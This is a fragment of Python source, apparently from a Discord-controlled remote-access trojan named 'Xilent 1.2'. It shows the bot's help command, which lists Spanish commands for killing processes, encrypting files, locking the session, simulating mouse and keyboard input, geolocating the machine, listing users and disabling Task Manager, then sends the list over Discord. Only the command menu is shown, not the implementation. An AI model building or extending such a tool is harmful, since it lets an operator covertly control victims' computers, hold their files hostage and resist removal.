        "!kill_process [PID] → Mata un proceso en ejecución. Ejemplo: !kill_process notepad.exe o !kill_process [PID]",

        "Comandos agregados - Xilent 1.2:",
        "!encrypt [ruta] [clave] → Encriptar archivos con AES. Ejemplo: !encrypt C:\\Users\\usuario\\Desktop\\file.txt",
        "!decrypt [ruta] [clave] → Desencriptar archivos. Ejemplo: !decrypt C:\\Users\\usuario\\Desktop\\file.txt.enc",
        "!lock → Bloquear la sesión del sistema.",
        "!move [x] [y] → Mover el cursor. Ejemplo: !move 10 5 (x,y)",
        "!click → Simula un clic del ratón.",
        "!type [texto] → Escribir en la pantalla (simula el teclado).",
        "!lookup → Obtener ubicación aproximada.",
        "!whoami → Obtener usuario actual logueado.",
        "!listusers → Obtener una lista de todos los usuarios registrados en el sistema.",
        "!wallpaper [URL] → Cambiar el fondo de pantalla del sistema. Ejemplo: !wallpaper + [URL]",
        "!volume [nivel] → Subir o bajar el volumen del sistema. Ejemplo: !volume 20",
        "!brightness [nivel] → Subir o bajar el brillo del sistema. Ejemplo: !brightness 40",
        "!mv [origen] [destino] → Mover archivos. Ejemplo: !mv C:\\Users\\usuario\\Desktop\\file.txt C:\\Users\\usuario\\Downloads",
        "!rename [ruta] [nuevo_nombre] → Renombrar archivos. Ejemplo: !rename C:\\Users\\usuario\\Desktop\\imagen.png wallpaper.png",
        "!mkdir [ruta] → Crear directorio nuevo. Ejemplo: !mkdir C:\\Users\\usuario\\carpeta1",
        "!killtask → Desactivar el Administrador de Tareas.",
        "!commands → Lista todos los comandos disponibles.",
    ]
    
    mensaje = "\n".join(comandos)

    file_path = 'comandos_lista.txt'
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(mensaje)

    await ctx.send("Aquí tienes la lista de comandos:", file=discord.File(file_path))
    os.remove(file_path)

#run_bot()